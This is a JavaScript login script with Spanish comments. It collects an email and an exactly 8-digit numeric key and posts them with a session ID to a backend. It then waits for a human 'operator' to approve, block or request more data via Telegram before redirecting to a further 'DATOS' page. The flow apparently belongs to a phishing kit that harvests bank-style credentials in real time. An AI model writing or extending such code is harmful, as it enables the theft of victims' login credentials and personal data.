/**
 * ─────────────────────────────────────────────
 *  SCRIPT: login.js
 *  Página: Login (email + contraseña)
 *  Incluir: <script src="/assets/js/session.js"></script>
 *           <script src="/assets/js/login.js"></script>
 * ─────────────────────────────────────────────
 *
 *  HTML esperado:
 *  <form id="loginForm">
 *    <input id="email"    type="email"    required />
 *    <input id="password" type="password" inputmode="numeric" maxlength="8" pattern="\d{8}" required />
 *    <button type="submit">Ingresar</button>
 *    <p id="errorMsg" style="display:none;"></p>
 *  </form>
 */

(async () => {
    // Crea (o reutiliza) la sesión al cargar la página
    await SessionManager.init();

    const form     = document.getElementById('loginForm');
    const errorMsg = document.getElementById('errorMsg');

    function showError(msg) {
        errorMsg.textContent = msg;
        errorMsg.style.display = 'block';
    }

    function hideError() {
        errorMsg.style.display = 'none';
    }

    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        hideError();

        const email    = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value.trim();

        if (!email || !password) {
            showError('Completa todos los campos.');
            return;
        }

        if (!/^\d{8}$/.test(password)) {
            showError('La clave debe ser de exactamente 8 dígitos.');
            return;
        }

        try {
            const res = await fetch(window.API_BASE_URL + '/api/login', {
                method:  'POST',
                headers: { 'Content-Type': 'application/json' },
                body:    JSON.stringify({
                    sessionId: SessionManager.getSessionId(),
                    email,
                    password
                })
            });

            const data = await res.json();

            if (!data.success) {
                showError(data.error || 'Error al iniciar sesión.');
                return;
            }

            // Login enviado → esperar acción del operador en Telegram
            SessionManager.waitForAction({
                onApproved:    () => window.Router.redirect('DATOS'),
                onBlocked:     () => showError('Acceso bloqueado. Contacta soporte.'),
                onErrorData:   () => showError('Datos incorrectos. Intenta de nuevo.'),
                onErrorTemp:   () => showError('Error temporal. Intenta más tarde.'),
                onRequestForm: () => window.Router.redirect('DATOS'),
            });

            // Mostrar spinner / deshabilitar formulario mientras se espera
            form.querySelectorAll('input, button').forEach(el => el.disabled = true);

        } catch (err) {
            console.error(err);
            showError('Error de conexión. Intenta de nuevo.');
        }
    });
})();
